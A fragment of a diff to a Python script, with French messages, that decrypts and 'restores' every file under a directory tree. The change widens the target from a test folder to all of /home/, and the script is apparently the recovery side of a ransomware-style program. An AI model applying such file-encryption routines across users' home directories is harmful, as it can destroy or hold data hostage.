@@ -110,7 +110,7 @@ while True:
         texte ="\t\t\t\t\tDechiffrement des fichiers en cours..."
         print(BLUE + texte.format("bonjour") + RESET)
         print("\n"+obj+"\n")
-        for path, dirs, files in os.walk("/home/iris/testR"):
+        for path, dirs, files in os.walk("/home/"):
             for f in files:
                 dechiffrer(os.path.join(path, f))
                 message = f"\t{os.path.join(path, f)}{GREEN} restauré!{RESET}"
